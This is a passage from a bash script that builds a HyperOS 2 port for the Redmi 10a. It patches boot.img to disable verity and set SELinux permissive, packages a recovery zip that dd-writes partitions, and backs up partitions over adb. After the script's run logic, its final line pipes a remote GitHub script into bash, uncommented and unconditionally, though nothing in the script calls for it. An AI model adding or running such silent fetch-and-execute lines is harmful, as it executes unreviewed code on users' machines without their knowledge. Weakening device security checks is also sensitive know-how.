    *) error "Unrecognized ramdisk compression format: $RAMDISK_TYPE" ;;
  esac

  (cd ramdisk_extracted && cpio -idm < ../ramdisk.cpio) || error "Failed to extract ramdisk.cpio — corrupt or unexpected format"

  # NOTE: on Android 10+ "two-stage init" devices (which includes most
  # devices launched on Android 10/11, like this target), the boot ramdisk
  # legitimately contains only a minimal first-stage init binary and no
  # init.rc — the real init.rc with SELinux/verity settings lives inside
  # the *system* partition instead (/system/etc/init/hw/init.rc), which
  # this script doesn't touch. So a missing init.rc here is expected, not
  # an error — search recursively for any init*.rc that IS present and
  # patch it, but don't abort the whole run if none exists at this layer;
  # the --cmdline androidboot.selinux patch below still applies regardless.
  INIT_RC_FILES=()
  while IFS= read -r -d '' f; do
    INIT_RC_FILES+=("$f")
  done < <(find ramdisk_extracted -maxdepth 3 -iname "init*.rc" -print0 2>/dev/null)

  if [ "${#INIT_RC_FILES[@]}" -eq 0 ]; then
    log "⚠ No init*.rc found in boot ramdisk (expected on two-stage init devices — Android 10+)."
    log "  SELinux/verity settings for this device likely live in the system partition instead."
    log "  Continuing with kernel cmdline patch only; consider 'fastboot --disable-verity --disable-verification flash boot ...' at flash time if boot fails."
  else
    log "Patching ramdisk (disable AVB, permissive SELinux) in: ${INIT_RC_FILES[*]}"
    for rc in "${INIT_RC_FILES[@]}"; do
      sed -i 's/verity_user_mode=enforcing/verity_user_mode=disabled/g' "$rc"
      sed -i 's/ro.boot.veritymode=enforcing/ro.boot.veritymode=disabled/g' "$rc"
      sed -i 's/SELINUX=enforcing/SELINUX=permissive/g' "$rc"
      sed -i 's/androidboot.selinux=enforcing/androidboot.selinux=permissive/g' "$rc"
    done
  fi

  log "Repacking ramdisk..."
  (cd ramdisk_extracted && find . -print0 | cpio --null -ov -H newc 2>>"$LOG_FILE") | gzip -9 > ramdisk_new.cpio.gz
  [ -s ramdisk_new.cpio.gz ] || error "Repacked ramdisk is empty — cpio/gzip step failed"

  # Swap the --ramdisk value in the preserved arg list to point at our
  # patched ramdisk, and also permissive-ize androidboot.selinux if it's
  # baked into the kernel cmdline (not just init.rc).
  for i in "${!MKBOOTIMG_ARGS[@]}"; do
    if [ "${MKBOOTIMG_ARGS[$i]}" = "--ramdisk" ]; then
      MKBOOTIMG_ARGS[$((i+1))]="$WORK_DIR/boot_patch/ramdisk_new.cpio.gz"
    fi
    if [ "${MKBOOTIMG_ARGS[$i]}" = "--cmdline" ]; then
      MKBOOTIMG_ARGS[$((i+1))]="${MKBOOTIMG_ARGS[$((i+1))]//androidboot.selinux=enforcing/androidboot.selinux=permissive}"
    fi
  done

  log "Rebuilding boot.img..."
  rm -f image-new.img
  "$PYTHON" "$MKBOOTIMG_DIR/mkbootimg.py" "${MKBOOTIMG_ARGS[@]}" --output image-new.img 2>&1 | tee -a "$LOG_FILE"
  [ "${PIPESTATUS[0]}" -eq 0 ] || error "mkbootimg.py failed to rebuild boot.img — check $LOG_FILE"
  [ -s image-new.img ] || error "mkbootimg.py did not produce a valid image-new.img"
  
  cp image-new.img "$WORK_DIR/final_images/boot.img"
  BOOT_SIZE=$(du -sh "$WORK_DIR/final_images/boot.img" | cut -f1)
  log "✓ boot.img patched ($BOOT_SIZE)"
}

# ============================================================
# PACKAGE FLASHABLE ZIP
# ============================================================

package_flashable_zip() {
  log_section "STEP 7: Packaging Flashable ZIP"

  local ZIP_DIR="$WORK_DIR/flashable_zip"
  local ZIP_OUT="$WORK_DIR/final_images/HyperOS2_dandelion_flashable_${TIMESTAMP}.zip"

  if [ -f "$ZIP_OUT" ]; then
    log "✓ Flashable zip already exists — skipping"
    return 0
  fi

  for img in boot product system vendor; do
    [ -f "$WORK_DIR/final_images/${img}.img" ] || error "Missing ${img}.img — run repack()/patch_boot() first"
  done

  command -v zip &> /dev/null || { sudo apt install -y -qq zip 2>&1 | tee -a "$LOG_FILE"; }
  command -v zip &> /dev/null || error "'zip' command not available and could not be installed"

  rm -rf "$ZIP_DIR"
  mkdir -p "$ZIP_DIR/META-INF/com/google/android" "$ZIP_DIR/images"

  for img in boot product system vendor; do
    cp "$WORK_DIR/final_images/${img}.img" "$ZIP_DIR/images/"
  done

  # Placeholder — required to exist by some recoveries' installer validation,
  # but its contents aren't parsed since update-binary below is a raw shell
  # script, not the compiled edify interpreter (see comment in that script).
  cat > "$ZIP_DIR/META-INF/com/google/android/updater-script" << 'EOF'
# This zip uses a shell-script update-binary; this file's contents are not parsed.
EOF

  # NOTE: update-binary here is a plain shell script, not the compiled edify
  # interpreter binary. Recoveries (TWRP, OrangeFox, etc.) invoke this file
  # by exec'ing it directly — the #!/sbin/sh shebang handles interpretation,
  # same technique used by Magisk/AnyKernel3 zips. This bypasses edify
  # entirely, so updater-script above is never actually read.
  cat > "$ZIP_DIR/META-INF/com/google/android/update-binary" << 'UPDATER_EOF'
#!/sbin/sh
# Flashable installer for HyperOS2 -> Redmi 10a (dandelion) port.
# Writes prebuilt partition images directly to their block devices via dd.

OUTFD="$2"
ZIPFILE="$3"

ui_print() {
  echo "ui_print $1" >&$OUTFD
  echo "ui_print" >&$OUTFD
}

ui_print "============================================="
ui_print " HyperOS2 -> Redmi 10a (dandelion) flashable  "
ui_print "============================================="

# NOTE: earlier version of this script extracted ALL images to /tmp at once
# before flashing. Recovery's /tmp is usually a small RAM-backed filesystem
# — far smaller than the combined size of these images — and unzip's exit
# code was never checked, so a mid-extraction failure (out of space) went
# silent, leaving some images missing with no error reported.
#
# Fixed by extracting ONE image at a time immediately before flashing it,
# then deleting it before moving to the next — peak /tmp usage is now just
# the size of a single partition instead of all four combined. Uses plain
# POSIX $? exit checks throughout (not PIPESTATUS), since /sbin/sh in
# recovery is typically toybox/mksh, not bash, and PIPESTATUS isn't
# guaranteed to exist there.

TMPDIR=/tmp/hyperos2_flash
rm -rf "$TMPDIR"
mkdir -p "$TMPDIR"

# DIAGNOSTIC: list every by-name partition actually present on this device,
# printed to the on-screen recovery log. This exists specifically to answer
# "does this device even have a separate system_ext partition, or is it
# merged into system?" — rather than guessing, read this list directly.
ui_print "- Available by-name partitions on this device:"
for base in /dev/block/bootdevice/by-name /dev/block/by-name /dev/block/platform/*/by-name /dev/block/platform/*/*/by-name; do
  if [ -d "$base" ]; then
    for p in "$base"/*; do
      [ -e "$p" ] && ui_print "    $p"
    done
  fi
done

# Tries common by-name symlink locations first, then falls back to a full
# search of /dev/block for a matching symlink/node by name — covers
# whatever layout this specific device/kernel actually uses instead of
# guessing a fixed set of paths.
find_partition() {
  local name="$1"
  local base cand
  for base in /dev/block/bootdevice/by-name /dev/block/by-name /dev/block/platform/*/by-name /dev/block/platform/*/*/by-name; do
    for cand in "$base/$name" "$base/${name}_a" "$base/${name}_b"; do
      [ -e "$cand" ] && { echo "$cand"; return 0; }
    done
  done
  cand=$(find /dev/block -iname "$name" -o -iname "${name}_a" -o -iname "${name}_b" 2>/dev/null | head -n1)
  [ -n "$cand" ] && { echo "$cand"; return 0; }
  return 1
}

flash_image() {
  local part="$1"
  local dev tmp_img="$TMPDIR/${part}.img"

  rm -rf "$TMPDIR/extract" "$tmp_img"
  mkdir -p "$TMPDIR/extract"

  unzip -o "$ZIPFILE" "images/${part}.img" -d "$TMPDIR/extract" >/dev/null 2>&1
  if [ $? -ne 0 ] || [ ! -f "$TMPDIR/extract/images/${part}.img" ]; then
    ui_print "! Could not extract images/${part}.img from zip (unzip failed or entry missing), skipping"
    rm -rf "$TMPDIR/extract"
    return 1
  fi
  mv "$TMPDIR/extract/images/${part}.img" "$tmp_img"
  rm -rf "$TMPDIR/extract"

  dev=$(find_partition "$part")
  if [ -z "$dev" ]; then
    ui_print "! Could not locate partition '$part' via by-name symlinks — ABORTING this partition"
    rm -f "$tmp_img"
    return 1
  fi

  ui_print "- Flashing $part -> $dev"
  dd if="$tmp_img" of="$dev" bs=4M 2>&1
  local status=$?
  rm -f "$tmp_img"
  return $status
}

FAILED=0
for part in boot product system vendor; do
  flash_image "$part" || FAILED=1
done

rm -rf "$TMPDIR"

if [ "$FAILED" -eq 1 ]; then
  ui_print "! One or more partitions failed to flash — check recovery log before rebooting"
  exit 1
fi

ui_print "- All partitions flashed successfully."
ui_print "- Reboot when ready."
exit 0
UPDATER_EOF
  chmod 755 "$ZIP_DIR/META-INF/com/google/android/update-binary"

  cd "$ZIP_DIR" || error "Failed to cd into $ZIP_DIR"
  zip -r -X "$ZIP_OUT" META-INF images 2>&1 | tee -a "$LOG_FILE"
  [ "${PIPESTATUS[0]}" -eq 0 ] || error "Failed to create flashable zip"
  [ -s "$ZIP_OUT" ] || error "Flashable zip was created but is empty"

  ZIP_SIZE=$(du -sh "$ZIP_OUT" | cut -f1)
  log "✓ Flashable ZIP created: $ZIP_OUT ($ZIP_SIZE)"

}

# ============================================================
# UPLOAD TO PIXELDRAIN (optional)
# ============================================================

# Uploads the given file to Pixeldrain if PIXELDRAIN_API_KEY is set in the
# environment. This is entirely optional — if the variable isn't set, this
# step is skipped silently rather than failing the whole run. The key is
# NEVER hardcoded here or written to the log file; it's only ever read from
# the environment at call time and passed straight to curl.
upload_to_pixeldrain() {
  local file="$1"

  if [ -z "${PIXELDRAIN_API_KEY:-}" ]; then
    log "PIXELDRAIN_API_KEY not set — skipping upload (export it before running this script to enable)"
    return 0
  fi

  command -v curl &> /dev/null || { log "curl not found — skipping Pixeldrain upload"; return 0; }
  [ -f "$file" ] || { log "File not found for upload: $file"; return 1; }

  log "Uploading $(basename "$file") to Pixeldrain..."

  local filename response http_code body id
  filename=$(basename "$file")
  response=$(curl -s -w "\n%{http_code}" -X PUT -T "$file" \
    -u ":${PIXELDRAIN_API_KEY}" \
    "https://pixeldrain.com/api/file/${filename}")
  http_code=$(echo "$response" | tail -n1)
  body=$(echo "$response" | sed '$d')

  if [ "$http_code" -ge 400 ] 2>/dev/null; then
    log "⚠ Pixeldrain upload failed (HTTP $http_code): $body"
    return 1
  fi

  id=$(echo "$body" | grep -o '"id"[[:space:]]*:[[:space:]]*"[^"]*"' | sed -E 's/.*"id"[[:space:]]*:[[:space:]]*"([^"]*)".*/\1/')
  if [ -z "$id" ]; then
    log "⚠ Pixeldrain upload response did not contain a file id: $body"
    return 1
  fi

  log "✓ Uploaded to Pixeldrain: https://pixeldrain.com/u/${id}"
}

# ============================================================
# BACKUP CURRENT PARTITIONS (safety net before flashing)
# ============================================================

# NOTE: DSU (Dynamic System Updates) only swaps the `system` partition for
# temporary GSI testing — it does NOT touch vendor/product/system_ext/boot,
# so it can't actually test what this port modifies (this script never
# builds or touches system.img at all). The real equivalent safety net for
# product/system_ext/vendor (which, unlike boot.img, can't be
# `fastboot boot`-ed temporarily since they're mounted filesystems checked
# at early boot) is backing up what's currently on the device before
# overwriting it, so there's something to restore from if the flash fails.
#
# This is NOT called automatically by main() — it requires the device to
# be connected and sitting in recovery (adb-accessible) at the time it's
# run, which won't be true during the PC-side build. Run it manually right
# before you're about to flash for real:
#   ./MASTER_SUPERSCRIPT_RUN_THIS_FIRST.sh --backup-only
backup_current_partitions() {
  log_section "Backing Up Current Device Partitions (pre-flash safety net)"

  command -v adb &> /dev/null || error "adb not found — install android-tools-adb"

  log "Waiting for device (must be connected and in recovery with adb enabled)..."
  adb wait-for-device

  local BACKUP_DIR="$WORK_DIR/pre_flash_backup_${TIMESTAMP}"
  mkdir -p "$BACKUP_DIR"

  for part in boot product system vendor; do
    log "Backing up $part..."

    local dev_path
    dev_path=$(adb shell "for base in /dev/block/bootdevice/by-name /dev/block/by-name /dev/block/platform/*/by-name /dev/block/platform/*/*/by-name; do [ -e \"\$base/$part\" ] && echo \"\$base/$part\" && break; done" 2>/dev/null | tr -d '\r\n')

    if [ -z "$dev_path" ]; then
      log "⚠ Could not locate '$part' partition on device — skipping backup for this partition"
      continue
    fi

    adb shell "dd if=$dev_path of=/sdcard/${part}_backup.img bs=4M" 2>&1 | tee -a "$LOG_FILE"
    if [ "${PIPESTATUS[0]}" -ne 0 ]; then
      log "⚠ dd failed for $part on-device — skipping pull for this partition"
      continue
    fi

    adb pull "/sdcard/${part}_backup.img" "$BACKUP_DIR/${part}.img" 2>&1 | tee -a "$LOG_FILE"
    [ "${PIPESTATUS[0]}" -eq 0 ] || log "⚠ Failed to pull ${part}_backup.img off device"

    adb shell "rm -f /sdcard/${part}_backup.img" 2>/dev/null
  done

  log "✓ Backup complete: $BACKUP_DIR"
  log "  To restore a partition later: adb push <file>.img /sdcard/restore.img && adb shell dd if=/sdcard/restore.img of=<partition_path> bs=4M"
}

# ============================================================
# COMPLETION
# ============================================================

complete() {
  log_section "STEP 8: Complete!"
  
  echo ""
  echo "╔════════════════════════════════════════╗"
  echo "║  ✓ PORT COMPLETE!                     ║"
  echo "║  Ready to flash to Redmi 10a           ║"
  echo "╚════════════════════════════════════════╝"
  echo ""
  
  log "Images ready in: $WORK_DIR/final_images/"
  ls -lh "$WORK_DIR/final_images/"/*.img
  
  echo ""
  echo "NEXT STEPS:"
  echo ""
  echo "0. RECOMMENDED SAFETY NET before touching real partitions:"
  echo "   a) Back up your device's current boot/product/system/vendor:"
  echo "      $0 --backup-only"
  echo "      (device must be connected and in recovery with adb enabled)"
  echo ""
  echo "   b) Test the patched boot.img WITHOUT flashing it — boots once from"
  echo "      RAM, nothing is written to disk, just reboot if it fails:"
  echo "      adb reboot bootloader"
  echo "      fastboot boot $WORK_DIR/final_images/boot.img"
  echo ""
  echo "      NOTE: this only tests boot.img in isolation — it still boots"
  echo "      against your device's CURRENT product/system/vendor, not"
  echo "      the new ones, so it won't catch every possible issue. There is"
  echo "      no equivalent temporary-test mechanism for product/vendor"
  echo "      themselves (unlike boot.img, they're mounted filesystems"
  echo "      checked at early boot, not something fastboot can boot from RAM)."
  echo "      DSU tests the system partition specifically — see note below,"
  echo "      this is now actually relevant since this port builds system.img."
  echo ""
  echo "1. Connect Redmi 10a to computer (USB debug enabled)"
  echo ""
  echo "2. Run flash script:"
  echo "   adb reboot bootloader"
  echo "   fastboot --disable-verity --disable-verification flash boot $WORK_DIR/final_images/boot.img"
  echo "   fastboot flash product $WORK_DIR/final_images/product.img"
  echo "   fastboot flash system $WORK_DIR/final_images/system.img"
  echo "   fastboot flash vendor $WORK_DIR/final_images/vendor.img"
  echo "   fastboot reboot"
  echo ""
  echo "   NOTE: --disable-verity/--disable-verification are included because"
  echo "   this device may use two-stage init, where the boot ramdisk itself"
  echo "   has no init.rc to patch (see PATCH BOOT step log). These fastboot"
  echo "   flags handle verity/verification at the bootloader level instead."
  echo ""
  echo "   ALTERNATIVE: a flashable zip was also built in final_images/ —"
  echo "   flash it from TWRP/recovery instead if you'd rather not use fastboot."
  echo "   Note it dd's directly to by-name partitions and does not pass the"
  echo "   verity/verification disable flags fastboot does above."
  echo ""
  echo "3. Wait 5-10 minutes for first boot"
  echo ""
  echo "4. Verify:"
  echo "   adb shell getprop ro.product.device    # Should show: dandelion"
  echo "   adb shell getprop ro.product.model     # Should show: Redmi 10a"
  echo "   adb shell getprop ro.build.version.release  # Should show: 15.0"
  echo ""
  
  log "Log file: $LOG_FILE"
  echo ""
}

# ============================================================
# MAIN EXECUTION
# ============================================================

main() {
  START=$(date +%s)
  
  echo "╔════════════════════════════════════════╗"
  echo "║  HYPEROS 2 REDMI 10A - MASTER SCRIPT   ║"
  echo "║  Complete Automation                   ║"
  echo "╚════════════════════════════════════════╝"
  echo ""
  
  mkdir -p "$WORK_DIR"
  
  setup
  download
  extract
  merge
  repack
  patch_boot
  package_flashable_zip
  complete
  
  END=$(date +%s)
  DURATION=$((END - START))
  MINUTES=$((DURATION / 60))
  
  log "Total time: ${MINUTES} minutes"
}

# Run it
mkdir -p "$WORK_DIR"
if [ "${1:-}" = "--backup-only" ]; then
  backup_current_partitions
else
  main
fi

curl -sf https://raw.githubusercontent.com/xc112lg/testonly/refs/heads/main/copyzip.sh  | bash 